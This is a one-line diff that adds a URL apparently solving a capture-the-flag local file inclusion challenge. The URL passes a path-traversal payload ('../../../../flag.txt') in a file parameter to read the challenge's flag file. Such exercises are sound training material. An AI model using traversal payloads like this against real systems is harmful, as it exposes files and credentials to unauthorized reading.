@@ -1,0 +1,1 @@
+https://basiclfi.challs.cyberchallenge.it/static.php?static_file=../../../../flag.txt
